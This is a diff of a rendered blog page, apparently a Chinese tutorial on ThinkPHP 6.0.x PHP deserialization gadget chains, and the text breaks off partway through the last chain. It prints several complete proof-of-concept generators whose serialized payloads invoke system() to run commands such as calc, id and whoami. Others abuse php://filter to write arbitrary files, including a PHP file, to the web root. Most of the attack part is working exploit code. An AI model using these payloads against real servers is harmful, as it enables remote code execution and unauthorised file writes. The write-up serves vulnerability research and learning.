@@ -18,12 +18,12 @@
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
     
-        <meta name="description" content="漏洞环境首先下载tp6.0.3 composer create-project topthink&#x2F;think&#x3D;6.0.3 tp603  然后更新版本 composer update   app&#x2F;controller&#x2F;Index.php设置反序列化可控点  漏洞分析利用链1全局搜索_destruct,定位到src\Model.php   $this-&gt;lazySave可控，">
+        <meta name="description" content="漏洞环境首先下载tp6.0.3 composer create-project topthink&#x2F;think&#x3D;6.0.3 tp603  然后更新版本 composer update     app&#x2F;controller&#x2F;Index.php设置反序列化可控点  漏洞分析利用链1全局搜索_destruct,定位到src\Model.php   $this-&amp;gt">
 <meta property="og:type" content="article">
 <meta property="og:title" content="ThinkPHP6.0.X反序列化利用链">
 <meta property="og:url" content="http://example.com/2024/07/10/ThinkPHP6-0-X%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/index.html">
 <meta property="og:site_name" content="p0l1st&#39;s blog">
-<meta property="og:description" content="漏洞环境首先下载tp6.0.3 composer create-project topthink&#x2F;think&#x3D;6.0.3 tp603  然后更新版本 composer update   app&#x2F;controller&#x2F;Index.php设置反序列化可控点  漏洞分析利用链1全局搜索_destruct,定位到src\Model.php   $this-&gt;lazySave可控，">
+<meta property="og:description" content="漏洞环境首先下载tp6.0.3 composer create-project topthink&#x2F;think&#x3D;6.0.3 tp603  然后更新版本 composer update     app&#x2F;controller&#x2F;Index.php设置反序列化可控点  漏洞分析利用链1全局搜索_destruct,定位到src\Model.php   $this-&amp;gt">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221825775.png">
 <meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221825872.png">
@@ -469,11 +469,13 @@
 
         <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
             <h1 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h1><p>首先下载tp6.0.3</p>
-<pre><code>composer create-project topthink/think=6.0.3 tp603
-</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">composer create-project topthink&#x2F;think&#x3D;6.0.3 tp603<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>然后更新版本</p>
-<pre><code>composer update
-</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">composer update<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
 <p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221825775.png" alt="image-20240710095443189"></p>
 <p>app&#x2F;controller&#x2F;Index.php设置反序列化可控点</p>
 <p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221825872.png" alt="image-20240710095655616"></p>
@@ -504,45 +506,45 @@
 <p><img lazyload src="/images/loading.svg" data-src="/../images/image-20240710105426998.png" alt="image-20240710105426998"></p>
 <p>跟进getValue方法，发现有$value   &#x3D; $closure($value, $this-&gt;data)，这里的$closure、$value和$this-&gt;data都是可控的，那么就可以使得$closure作为函数名、$value和$this-&gt;data作为参数实现任意函数执行</p>
 <p><img lazyload src="/images/loading.svg" data-src="/../images/image-20240710105649242.png" alt="image-20240710105649242"></p>
-<h3 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h3><pre><code class="php">&lt;?php
-namespace think;
-abstract class Model&#123;
-    use model\concern\Attribute;
-    use model\concern\ModelEvent;
-    protected $table;
-    private $force;
-    private $exists;
-    private $lazySave;
-    private $data = [];
-    function __construct($obj)&#123;
-        $this-&gt;table = $obj;
-        $this-&gt;force = true;
-        $this-&gt;exists = true;
-        $this-&gt;lazySave = true;
-        $this-&gt;data = [&quot;p0l1st&quot; =&gt; &quot;calc&quot;];
-    &#125;
-&#125;
+<h3 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">namespace</span> <span class="token package">think</span><span class="token punctuation">;</span>
+<span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">Model</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">use</span> <span class="token package">model<span class="token punctuation">\</span>concern<span class="token punctuation">\</span>Attribute</span><span class="token punctuation">;</span>
+    <span class="token keyword">use</span> <span class="token package">model<span class="token punctuation">\</span>concern<span class="token punctuation">\</span>ModelEvent</span><span class="token punctuation">;</span>
+    <span class="token keyword">protected</span> <span class="token variable">$table</span><span class="token punctuation">;</span>
+    <span class="token keyword">private</span> <span class="token variable">$force</span><span class="token punctuation">;</span>
+    <span class="token keyword">private</span> <span class="token variable">$exists</span><span class="token punctuation">;</span>
+    <span class="token keyword">private</span> <span class="token variable">$lazySave</span><span class="token punctuation">;</span>
+    <span class="token keyword">private</span> <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">table</span> <span class="token operator">=</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">force</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">exists</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">lazySave</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"p0l1st"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"calc"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
 
-namespace think\model\concern;
-trait ModelEvent&#123;
-    protected $withEvent = true;
-    protected $visible = [&quot;p0l1st&quot; =&gt; &quot;1&quot;];
-&#125;
-trait Attribute&#123;
-    private $withAttr = [&quot;p0l1st&quot; =&gt; &quot;system&quot;];
-&#125;
+<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>concern</span><span class="token punctuation">;</span>
+<span class="token keyword">trait</span> <span class="token class-name-definition class-name">ModelEvent</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">protected</span> <span class="token variable">$withEvent</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
+    <span class="token keyword">protected</span> <span class="token variable">$visible</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"p0l1st"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"1"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">trait</span> <span class="token class-name-definition class-name">Attribute</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">private</span> <span class="token variable">$withAttr</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"p0l1st"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"system"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
 
-namespace think\model;
-use think\Model;
-class Pivot extends Model&#123;
-    function __construct($obj = &#39;&#39;)&#123;
-        parent::__construct($obj);
-    &#125;
-&#125;
+<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span><span class="token punctuation">;</span>
+<span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>Model</span><span class="token punctuation">;</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">Pivot</span> <span class="token keyword">extends</span> <span class="token class-name">Model</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword static-context">parent</span><span class="token operator">::</span><span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
 
-echo urlencode(serialize(new Pivot(new Pivot())));
-?&gt;
-</code></pre>
+<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Pivot</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Pivot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p><img lazyload src="/images/loading.svg" data-src="/../images/image-20240710110533476.png" alt="image-20240710110533476"></p>
 <h2 id="利用链2"><a href="#利用链2" class="headerlink" title="利用链2"></a>利用链2</h2><p>继续全局搜索_destruct，跟进vendor\league\flysystem-cached-adapter\src\Storage\AbstractCache.php</p>
 <p><img lazyload src="/images/loading.svg" data-src="/../images/image-20240710111255038.png" alt="image-20240710111255038"></p>
@@ -563,46 +565,48 @@ echo urlencode(serialize(new Pivot(new Pivot())));
 <p>再看$data,$data来源于$value，而$value来源于$contents，$contents来源于getForStorage，需要经过json_encode方法处理，所以需要使json_encode后的数据被当作代码执行</p>
 <p>Linux中可以用这样的形式</p>
 <p><img lazyload src="/images/loading.svg" data-src="/../images/image-20240710121445539.png" alt="image-20240710121445539"></p>
-<pre><code class="php">&lt;?php 
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
 
-namespace League\Flysystem\Cached\Storage &#123;
-    abstract class AbstractCache &#123;
-        protected $autosave = false;
-        protected $complete = &quot;`id`&quot;;
-        // protected $complete = &quot;\&quot;&amp;whoami&amp;&quot; ;
-        // 在Windows环境中反引号无效，用&amp;替代
-    &#125;
-&#125;
+<span class="token keyword">namespace</span> <span class="token package">League<span class="token punctuation">\</span>Flysystem<span class="token punctuation">\</span>Cached<span class="token punctuation">\</span>Storage</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">AbstractCache</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">protected</span> <span class="token variable">$autosave</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
+        <span class="token keyword">protected</span> <span class="token variable">$complete</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"`id`"</span><span class="token punctuation">;</span>
+        <span class="token comment">// protected $complete = "\"&amp;whoami&amp;" ;</span>
+        <span class="token comment">// 在Windows环境中反引号无效，用&amp;替代</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
 
-namespace think\filesystem &#123;
-    use League\Flysystem\Cached\Storage\AbstractCache;
-    class CacheStore extends AbstractCache &#123;
-        protected $key = &quot;1&quot;;
-        protected $store;
-        public function __construct($store=&quot;&quot;) &#123;
-            $this-&gt;store = $store;
-        &#125;
-    &#125;
-&#125;
+<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>filesystem</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">use</span> <span class="token package">League<span class="token punctuation">\</span>Flysystem<span class="token punctuation">\</span>Cached<span class="token punctuation">\</span>Storage<span class="token punctuation">\</span>AbstractCache</span><span class="token punctuation">;</span>
+    <span class="token keyword">class</span> <span class="token class-name-definition class-name">CacheStore</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractCache</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">protected</span> <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"1"</span><span class="token punctuation">;</span>
+        <span class="token keyword">protected</span> <span class="token variable">$store</span><span class="token punctuation">;</span>
+        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$store</span><span class="token operator">=</span><span class="token string double-quoted-string">""</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">store</span> <span class="token operator">=</span> <span class="token variable">$store</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
 
-namespace think\cache &#123;
-    abstract class Driver &#123;
-        protected $options = [&quot;serialize&quot;=&gt;[&quot;system&quot;],&quot;expire&quot;=&gt;1,&quot;prefix&quot;=&gt;&quot;1&quot;,&quot;hash_type&quot;=&gt;&quot;sha256&quot;,&quot;cache_subdir&quot;=&gt;&quot;1&quot;,&quot;path&quot;=&gt;&quot;1&quot;];
-    &#125;
-&#125;
+<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>cache</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">Driver</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">protected</span> <span class="token variable">$options</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"serialize"</span><span class="token operator">=></span><span class="token punctuation">[</span><span class="token string double-quoted-string">"system"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"expire"</span><span class="token operator">=></span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"prefix"</span><span class="token operator">=></span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"hash_type"</span><span class="token operator">=></span><span class="token string double-quoted-string">"sha256"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"cache_subdir"</span><span class="token operator">=></span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"path"</span><span class="token operator">=></span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
 
-namespace think\cache\driver &#123;
-    use think\cache\Driver;
-    class File extends Driver&#123;&#125;
-&#125;
+<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>cache<span class="token punctuation">\</span>driver</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>cache<span class="token punctuation">\</span>Driver</span><span class="token punctuation">;</span>
+    <span class="token keyword">class</span> <span class="token class-name-definition class-name">File</span> <span class="token keyword">extends</span> <span class="token class-name">Driver</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
 
-namespace &#123;
-    $file = new think\cache\driver\File();
-    $cache = new think\filesystem\CacheStore($file);
-    echo base64_encode(serialize($cache));
-&#125;
-?&gt;
-</code></pre>
+<span class="token keyword">namespace</span> <span class="token punctuation">&#123;</span>
+    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">think<span class="token punctuation">\</span>cache<span class="token punctuation">\</span>driver<span class="token punctuation">\</span>File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$cache</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">think<span class="token punctuation">\</span>filesystem<span class="token punctuation">\</span>CacheStore</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$cache</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
 <h3 id="PoC2"><a href="#PoC2" class="headerlink" title="PoC2"></a>PoC2</h3><p>继续跟进src&#x2F;think&#x2F;cache&#x2F;driver&#x2F;File.php中的set方法，该方法后面还调用了file_put_contents方法</p>
 <p><img lazyload src="/images/loading.svg" data-src="/../images/image-20240710122144858.png" alt="image-20240710122144858"></p>
 <p>先跟进$filename，发现其又调用了getCacheKey方法</p>
@@ -611,44 +615,44 @@ namespace &#123;
 <p><img lazyload src="/images/loading.svg" data-src="/../images/image-20240710122453451.png" alt="image-20240710122453451"></p>
 <p>再看$data，其来源于$this-&gt;serialize($value)，但是后面拼接时有exit()，可以使用php:&#x2F;&#x2F;filter绕过</p>
 <p>那么至此就存在任意文件写入</p>
-<pre><code class="php">&lt;?php
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 
-namespace League\Flysystem\Cached\Storage &#123;
-    abstract class AbstractCache &#123;
-        protected $autosave = false;
-        protected $complete = &quot;uuuPD9waHAgcGhwaW5mbygpOw==&quot;;
-    &#125;
-&#125;
+<span class="token keyword">namespace</span> <span class="token package">League<span class="token punctuation">\</span>Flysystem<span class="token punctuation">\</span>Cached<span class="token punctuation">\</span>Storage</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">AbstractCache</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">protected</span> <span class="token variable">$autosave</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
+        <span class="token keyword">protected</span> <span class="token variable">$complete</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"uuuPD9waHAgcGhwaW5mbygpOw=="</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
 
-namespace think\filesystem &#123;
-    use League\Flysystem\Cached\Storage\AbstractCache;
-    class CacheStore extends AbstractCache &#123;
-        protected $key = &quot;1&quot;;
-        protected $store;
-        public function __construct($store=&quot;&quot;) &#123;
-            $this-&gt;store = $store;
-        &#125;
-    &#125;
-&#125;
+<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>filesystem</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">use</span> <span class="token package">League<span class="token punctuation">\</span>Flysystem<span class="token punctuation">\</span>Cached<span class="token punctuation">\</span>Storage<span class="token punctuation">\</span>AbstractCache</span><span class="token punctuation">;</span>
+    <span class="token keyword">class</span> <span class="token class-name-definition class-name">CacheStore</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractCache</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">protected</span> <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"1"</span><span class="token punctuation">;</span>
+        <span class="token keyword">protected</span> <span class="token variable">$store</span><span class="token punctuation">;</span>
+        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$store</span><span class="token operator">=</span><span class="token string double-quoted-string">""</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">store</span> <span class="token operator">=</span> <span class="token variable">$store</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
 
-namespace think\cache &#123;
-    abstract class Driver &#123;
-        protected $options = [&quot;serialize&quot;=&gt;[&quot;trim&quot;],&quot;expire&quot;=&gt;1,&quot;prefix&quot;=&gt;false,&quot;hash_type&quot;=&gt;&quot;md5&quot;,&quot;cache_subdir&quot;=&gt;false,&quot;path&quot;=&gt;&quot;php://filter/write=convert.base64-decode/resource=../&quot;,&quot;data_compress&quot;=&gt;0];
-    &#125;
-&#125;
+<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>cache</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">Driver</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">protected</span> <span class="token variable">$options</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"serialize"</span><span class="token operator">=></span><span class="token punctuation">[</span><span class="token string double-quoted-string">"trim"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"expire"</span><span class="token operator">=></span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"prefix"</span><span class="token operator">=></span><span class="token constant boolean">false</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"hash_type"</span><span class="token operator">=></span><span class="token string double-quoted-string">"md5"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"cache_subdir"</span><span class="token operator">=></span><span class="token constant boolean">false</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"path"</span><span class="token operator">=></span><span class="token string double-quoted-string">"php://filter/write=convert.base64-decode/resource=../"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"data_compress"</span><span class="token operator">=></span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
 
-namespace think\cache\driver &#123;
-    use think\cache\Driver;
-    class File extends Driver&#123;&#125;
-&#125;
+<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>cache<span class="token punctuation">\</span>driver</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>cache<span class="token punctuation">\</span>Driver</span><span class="token punctuation">;</span>
+    <span class="token keyword">class</span> <span class="token class-name-definition class-name">File</span> <span class="token keyword">extends</span> <span class="token class-name">Driver</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
 
-namespace &#123;
-    $file = new think\cache\driver\File();
-    $cache = new think\filesystem\CacheStore($file);
-    echo urlencode(serialize($cache));
-&#125;
-?&gt;
-</code></pre>
+<span class="token keyword">namespace</span> <span class="token punctuation">&#123;</span>
+    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">think<span class="token punctuation">\</span>cache<span class="token punctuation">\</span>driver<span class="token punctuation">\</span>File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$cache</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">think<span class="token punctuation">\</span>filesystem<span class="token punctuation">\</span>CacheStore</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$cache</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p><img lazyload src="/images/loading.svg" data-src="/../images/image-20240710123707632.png" alt="image-20240710123707632"></p>
 <h2 id="利用链3"><a href="#利用链3" class="headerlink" title="利用链3"></a>利用链3</h2><p>链子的起点和上一条链子一样，但是这里选择跟进vendor\league\flysystem-cached-adapter\src\Storage\Adapter.php的save方法</p>
 <p>$contents来自$this-&gt;getForStorage()，后面处理也和上一条链子一样</p>
@@ -662,40 +666,40 @@ namespace &#123;
 <p>再看write方法，$location为经过applyPathPrefix方法处理的路径，$contents是经过json_encode处理后的json数据</p>
 <p><img lazyload src="/images/loading.svg" data-src="/../images/image-20240710143805789.png" alt="image-20240710143805789"></p>
 <p><img lazyload src="/images/loading.svg" data-src="/../images/image-20240710143722191.png" alt="image-20240710143722191"></p>
-<h3 id="PoC-1"><a href="#PoC-1" class="headerlink" title="PoC"></a>PoC</h3><pre><code class="php">&lt;?php
+<h3 id="PoC-1"><a href="#PoC-1" class="headerlink" title="PoC"></a>PoC</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 
-namespace League\Flysystem\Cached\Storage &#123;
-    abstract class AbstractCache &#123;
-        protected $autosave = false;
-        protected $cache = [&quot;p0l1st&quot; =&gt; &quot;&lt;?php phpinfo();?&gt;&quot;];
-    &#125;
-&#125;
+<span class="token keyword">namespace</span> <span class="token package">League<span class="token punctuation">\</span>Flysystem<span class="token punctuation">\</span>Cached<span class="token punctuation">\</span>Storage</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">AbstractCache</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">protected</span> <span class="token variable">$autosave</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
+        <span class="token keyword">protected</span> <span class="token variable">$cache</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"p0l1st"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"&lt;?php phpinfo();?>"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
 
-namespace League\Flysystem\Cached\Storage &#123;
-    use League\Flysystem\Cached\Storage\AbstractCache;
-    class Adapter extends AbstractCache &#123;
-        protected $file;
-        protected $adapter;
-        public function __construct($adapter = &quot;&quot;) &#123;
-            $this-&gt;file = &quot;../ppppp.php&quot;;
-            $this-&gt;adapter = $adapter;
-        &#125;
-    &#125;
-&#125;
+<span class="token keyword">namespace</span> <span class="token package">League<span class="token punctuation">\</span>Flysystem<span class="token punctuation">\</span>Cached<span class="token punctuation">\</span>Storage</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">use</span> <span class="token package">League<span class="token punctuation">\</span>Flysystem<span class="token punctuation">\</span>Cached<span class="token punctuation">\</span>Storage<span class="token punctuation">\</span>AbstractCache</span><span class="token punctuation">;</span>
+    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Adapter</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractCache</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">protected</span> <span class="token variable">$file</span><span class="token punctuation">;</span>
+        <span class="token keyword">protected</span> <span class="token variable">$adapter</span><span class="token punctuation">;</span>
+        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$adapter</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"../ppppp.php"</span><span class="token punctuation">;</span>
+            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">adapter</span> <span class="token operator">=</span> <span class="token variable">$adapter</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
 
-namespace League\Flysystem\Adapter &#123;
-    class Local &#123;
-        protected $writeFlags = 0;
-    &#125;
-&#125;
+<span class="token keyword">namespace</span> <span class="token package">League<span class="token punctuation">\</span>Flysystem<span class="token punctuation">\</span>Adapter</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Local</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">protected</span> <span class="token variable">$writeFlags</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
 
-namespace &#123;
-    $local = new League\Flysystem\Adapter\Local();
-    $cache = new League\Flysystem\Cached\Storage\Adapter($local);
-    echo urlencode(serialize($cache));
-&#125;
-?&gt;
-</code></pre>
+<span class="token keyword">namespace</span> <span class="token punctuation">&#123;</span>
